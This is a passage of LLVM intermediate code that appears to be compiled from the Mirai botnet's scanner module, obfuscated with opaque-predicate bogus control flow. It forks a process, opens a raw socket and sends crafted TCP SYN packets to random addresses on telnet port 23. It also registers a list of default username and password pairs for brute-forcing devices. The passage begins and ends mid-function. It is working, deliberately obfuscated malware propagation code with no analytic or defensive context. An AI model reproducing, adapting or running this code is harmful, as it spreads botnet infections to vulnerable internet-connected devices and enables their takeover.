  store i32 %63, i32* %12, align 4
  %64 = icmp ne i32 %62, 0
  br label %originalBB1
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @scanner_init() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.fd_set.26, align 8
  %6 = alloca %struct.fd_set.26, align 8
  %7 = alloca %struct.scanner_connection*, align 8
  %8 = alloca %struct.timeval.27, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca %struct.iphdr*, align 8
  %16 = alloca %struct.tcphdr*, align 8
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca [1514 x i8], align 16
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.tcphdr*, align 8
  %22 = alloca %struct.scanner_connection*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i8*, align 8
  %43 = alloca i32, align 4
  %44 = alloca i8*, align 8
  %45 = alloca i32, align 4
  %46 = call i32 @fork() #6
  store i32 %46, i32* @scanner_pid, align 4
  %47 = load i32, i32* @scanner_pid, align 4
  %48 = icmp sgt i32 %47, 0
  br i1 %48, label %52, label %49

; <label>:49:                                     ; preds = %0
  %50 = load i32, i32* @scanner_pid, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %69

; <label>:52:                                     ; preds = %49, %0
  %53 = load i32, i32* @x.53
  %54 = load i32, i32* @y.54
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %52
  %61 = load i32, i32* @x.53
  %62 = load i32, i32* @y.54
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

; <label>:69:                                     ; preds = %49
  %70 = call i32 @util_local_addr()
  store i32 %70, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %71 = call i64 @time(i64* null) #6
  %72 = trunc i64 %71 to i32
  store i32 %72, i32* @fake_time, align 4
  %73 = call noalias i8* @calloc(i64 256, i64 296) #6
  %74 = bitcast i8* %73 to %struct.scanner_connection*
  store %struct.scanner_connection* %74, %struct.scanner_connection** @conn_table, align 8
  store i32 0, i32* %1, align 4
  br label %75

; <label>:75:                                     ; preds = %89, %69
  %76 = load i32, i32* %1, align 4
  %77 = icmp slt i32 %76, 256
  br i1 %77, label %78, label %92

; <label>:78:                                     ; preds = %75
  %79 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %80 = load i32, i32* %1, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %79, i64 %81
  %83 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %82, i32 0, i32 3
  store i32 0, i32* %83, align 8
  %84 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %85 = load i32, i32* %1, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %84, i64 %86
  %88 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %87, i32 0, i32 1
  store i32 -1, i32* %88, align 8
  br label %89

; <label>:89:                                     ; preds = %78
  %90 = load i32, i32* %1, align 4
  %91 = add nsw i32 %90, 1
  store i32 %91, i32* %1, align 4
  br label %75

; <label>:92:                                     ; preds = %75
  %93 = load i32, i32* @x.53
  %94 = load i32, i32* @y.54
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %92
  %101 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %101, i32* @rsck, align 4
  %102 = icmp eq i32 %101, -1
  %103 = load i32, i32* @x.53
  %104 = load i32, i32* @y.54
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %102, label %111, label %128

; <label>:111:                                    ; preds = %originalBBpart24
  %112 = load i32, i32* @x.53
  %113 = load i32, i32* @y.54
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %111
  %120 = load i32, i32* @x.53
  %121 = load i32, i32* @y.54
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %128

; <label>:128:                                    ; preds = %originalBBpart28, %originalBBpart24
  %129 = load i32, i32* @rsck, align 4
  %130 = load i32, i32* @rsck, align 4
  %131 = call i32 (i32, i32, ...) @fcntl(i32 %130, i32 3, i32 0)
  %132 = or i32 2048, %131
  %133 = call i32 (i32, i32, ...) @fcntl(i32 %129, i32 4, i32 %132)
  store i32 1, i32* %1, align 4
  %134 = load i32, i32* @rsck, align 4
  %135 = bitcast i32* %1 to i8*
  %136 = call i32 @setsockopt(i32 %134, i32 0, i32 3, i8* %135, i32 4) #6
  %137 = icmp ne i32 %136, 0
  br i1 %137, label %138, label %157

; <label>:138:                                    ; preds = %128
  %139 = load i32, i32* @x.53
  %140 = load i32, i32* @y.54
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %138
  %147 = load i32, i32* @rsck, align 4
  %148 = call i32 @close(i32 %147)
  %149 = load i32, i32* @x.53
  %150 = load i32, i32* @y.54
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %157

; <label>:157:                                    ; preds = %originalBBpart212, %128
  br label %158

; <label>:158:                                    ; preds = %162, %157
  %159 = call i32 @rand_next()
  %160 = and i32 %159, 65535
  %161 = trunc i32 %160 to i16
  store i16 %161, i16* %2, align 2
  br label %162

; <label>:162:                                    ; preds = %158
  %163 = load i16, i16* %2, align 2
  %164 = call zeroext i16 @ntohs(i16 zeroext %163) #7
  %165 = zext i16 %164 to i32
  %166 = icmp slt i32 %165, 1024
  br i1 %166, label %158, label %167

; <label>:167:                                    ; preds = %162
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %3, align 8
  %168 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i64 1
  %170 = bitcast %struct.iphdr* %169 to %struct.tcphdr*
  store %struct.tcphdr* %170, %struct.tcphdr** %4, align 8
  %171 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %172 = bitcast %struct.iphdr* %171 to i8*
  %173 = load i8, i8* %172, align 4
  %174 = and i8 %173, -16
  %175 = or i8 %174, 5
  store i8 %175, i8* %172, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %177 = bitcast %struct.iphdr* %176 to i8*
  %178 = load i8, i8* %177, align 4
  %179 = and i8 %178, 15
  %180 = or i8 %179, 64
  store i8 %180, i8* %177, align 4
  %181 = call zeroext i16 @htons(i16 zeroext 40) #7
  %182 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 2
  store i16 %181, i16* %183, align 2
  %184 = call i32 @rand_next()
  %185 = trunc i32 %184 to i16
  %186 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 3
  store i16 %185, i16* %187, align 4
  %188 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 5
  store i8 64, i8* %189, align 4
  %190 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 6
  store i8 6, i8* %191, align 1
  %192 = call zeroext i16 @htons(i16 zeroext 23) #7
  %193 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %194 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %193, i32 0, i32 1
  store i16 %192, i16* %194, align 2
  %195 = load i16, i16* %2, align 2
  %196 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 0
  store i16 %195, i16* %197, align 4
  %198 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 4
  %200 = load i16, i16* %199, align 4
  %201 = and i16 %200, -241
  %202 = or i16 %201, 80
  store i16 %202, i16* %199, align 4
  %203 = call i32 @rand_next()
  %204 = and i32 %203, 65535
  %205 = trunc i32 %204 to i16
  %206 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %207 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %206, i32 0, i32 5
  store i16 %205, i16* %207, align 2
  %208 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 4
  %210 = load i16, i16* %209, align 4
  %211 = and i16 %210, -513
  %212 = or i16 %211, 512
  store i16 %212, i16* %209, align 4
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0), i16 zeroext 14)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i16 zeroext 13)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.8, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.9, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.11, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0), i16 zeroext 11)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.13, i32 0, i32 0), i16 zeroext 16)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.14, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.15, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.16, i32 0, i32 0), i16 zeroext 11)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.17, i32 0, i32 0), i16 zeroext 13)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.18, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.19, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.20, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.21, i32 0, i32 0), i16 zeroext 11)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.21, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.23, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 14)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.25, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i32 0, i32 0), i16 zeroext 13)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 6)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i32 0, i32 0), i16 zeroext 3)
  br label %213

; <label>:213:                                    ; preds = %1778, %167
  %214 = load i32, i32* @x.53
  %215 = load i32, i32* @y.54
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %213
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %222 = load i32, i32* @fake_time, align 4
  %223 = load i32, i32* %10, align 4
  %224 = icmp ne i32 %222, %223
  %225 = load i32, i32* @x.53
  %226 = load i32, i32* @y.54
  %227 = sub i32 %225, 1
  %228 = mul i32 %225, %227
  %229 = urem i32 %228, 2
  %230 = icmp eq i32 %229, 0
  %231 = icmp slt i32 %226, 10
  %232 = or i1 %230, %231
  br i1 %232, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %224, label %233, label %297

; <label>:233:                                    ; preds = %originalBBpart216
  %234 = load i32, i32* @fake_time, align 4
  store i32 %234, i32* %10, align 4
  store i32 0, i32* %1, align 4
  br label %235

; <label>:235:                                    ; preds = %293, %233
  %236 = load i32, i32* %1, align 4
  %237 = icmp slt i32 %236, 384
  br i1 %237, label %238, label %296

; <label>:238:                                    ; preds = %235
  %239 = bitcast %struct.sockaddr_in* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* %239, i8 0, i64 16, i32 4, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %15, align 8
  %240 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %241 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %240, i64 1
  %242 = bitcast %struct.iphdr* %241 to %struct.tcphdr*
  store %struct.tcphdr* %242, %struct.tcphdr** %16, align 8
  %243 = call i32 @rand_next()
  %244 = trunc i32 %243 to i16
  %245 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %246 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %245, i32 0, i32 3
  store i16 %244, i16* %246, align 4
  %247 = load i32, i32* @LOCAL_ADDR, align 4
  %248 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %249 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %248, i32 0, i32 8
  store i32 %247, i32* %249, align 4
  %250 = call i32 @get_random_ip()
  %251 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %252 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %251, i32 0, i32 9
  store i32 %250, i32* %252, align 4
  %253 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %254 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %253, i32 0, i32 7
  store i16 0, i16* %254, align 2
  %255 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %256 = bitcast %struct.iphdr* %255 to i16*
  %257 = call zeroext i16 @checksum_generic(i16* %256, i32 20)
  %258 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %259 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %258, i32 0, i32 7
  store i16 %257, i16* %259, align 2
  %260 = call zeroext i16 @htons(i16 zeroext 23) #7
  %261 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %262 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %261, i32 0, i32 1
  store i16 %260, i16* %262, align 2
  %263 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %264 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %263, i32 0, i32 9
  %265 = load i32, i32* %264, align 4
  %266 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %267 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %266, i32 0, i32 2
  store i32 %265, i32* %267, align 4
  %268 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %269 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %268, i32 0, i32 6
  store i16 0, i16* %269, align 4
  %270 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %271 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %272 = bitcast %struct.tcphdr* %271 to i8*
  %273 = call zeroext i16 @htons(i16 zeroext 20) #7
  %274 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %270, i8* %272, i16 zeroext %273, i32 20)
  %275 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %276 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %275, i32 0, i32 6
  store i16 %274, i16* %276, align 4
  %277 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %277, align 4
  %278 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %279 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %278, i32 0, i32 9
  %280 = load i32, i32* %279, align 4
  %281 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %282 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %281, i32 0, i32 0
  store i32 %280, i32* %282, align 4
  %283 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %284 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %283, i32 0, i32 1
  %285 = load i16, i16* %284, align 2
  %286 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %285, i16* %286, align 2
  %287 = load i32, i32* @rsck, align 4
  %288 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %289 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  store %struct.sockaddr* %289, %struct.sockaddr** %288, align 8
  %290 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %291 = load %struct.sockaddr*, %struct.sockaddr** %290, align 8
  %292 = call i64 @sendto(i32 %287, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %291, i32 16)
  br label %293

; <label>:293:                                    ; preds = %238
  %294 = load i32, i32* %1, align 4
  %295 = add nsw i32 %294, 1
  store i32 %295, i32* %1, align 4
  br label %235

; <label>:296:                                    ; preds = %235
  br label %297

; <label>:297:                                    ; preds = %296, %originalBBpart216
  store i32 0, i32* %9, align 4
  br label %298

; <label>:298:                                    ; preds = %639, %563, %535, %originalBBpart262, %503, %479, %471, %462, %437, %originalBBpart236, %375, %297
  %299 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %300 = bitcast i8* %299 to %struct.iphdr*
  store %struct.iphdr* %300, %struct.iphdr** %20, align 8
  %301 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i64 1
  %303 = bitcast %struct.iphdr* %302 to %struct.tcphdr*
  store %struct.tcphdr* %303, %struct.tcphdr** %21, align 8
  %304 = call i32* @__errno_location() #7
  store i32 0, i32* %304, align 4
  %305 = load i32, i32* @rsck, align 4
  %306 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %307 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %307, align 8
  %308 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %309 = load %struct.sockaddr*, %struct.sockaddr** %308, align 8
  %310 = call i64 @recvfrom(i32 %305, i8* %306, i64 1514, i32 16384, %struct.sockaddr* %309, i32* null)
  %311 = trunc i64 %310 to i32
  store i32 %311, i32* %18, align 4
  %312 = load i32, i32* %18, align 4
  %313 = icmp sle i32 %312, 0
  br i1 %313, label %338, label %314

; <label>:314:                                    ; preds = %298
  %315 = load i32, i32* @x.53
  %316 = load i32, i32* @y.54
  %317 = sub i32 %315, 1
  %318 = mul i32 %315, %317
  %319 = urem i32 %318, 2
  %320 = icmp eq i32 %319, 0
  %321 = icmp slt i32 %316, 10
  %322 = or i1 %320, %321
  br i1 %322, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %314
  %323 = call i32* @__errno_location() #7
  %324 = load i32, i32* %323, align 4
  %325 = icmp eq i32 %324, 11
  %326 = load i32, i32* @x.53
  %327 = load i32, i32* @y.54
  %328 = sub i32 %326, 1
  %329 = mul i32 %326, %328
  %330 = urem i32 %329, 2
  %331 = icmp eq i32 %330, 0
  %332 = icmp slt i32 %327, 10
  %333 = or i1 %331, %332
  br i1 %333, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %325, label %338, label %334

; <label>:334:                                    ; preds = %originalBBpart220
  %335 = call i32* @__errno_location() #7
  %336 = load i32, i32* %335, align 4
  %337 = icmp eq i32 %336, 11
  br i1 %337, label %338, label %355

; <label>:338:                                    ; preds = %334, %originalBBpart220, %298
  %339 = load i32, i32* @x.53
  %340 = load i32, i32* @y.54
  %341 = sub i32 %339, 1
  %342 = mul i32 %339, %341
  %343 = urem i32 %342, 2
  %344 = icmp eq i32 %343, 0
  %345 = icmp slt i32 %340, 10
  %346 = or i1 %344, %345
  br i1 %346, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %338
  %347 = load i32, i32* @x.53
  %348 = load i32, i32* @y.54
  %349 = sub i32 %347, 1
  %350 = mul i32 %347, %349
  %351 = urem i32 %350, 2
  %352 = icmp eq i32 %351, 0
  %353 = icmp slt i32 %348, 10
  %354 = or i1 %352, %353
  br i1 %354, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %651

; <label>:355:                                    ; preds = %334
  %356 = load i32, i32* @x.53
  %357 = load i32, i32* @y.54
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %355
  %364 = load i32, i32* %18, align 4
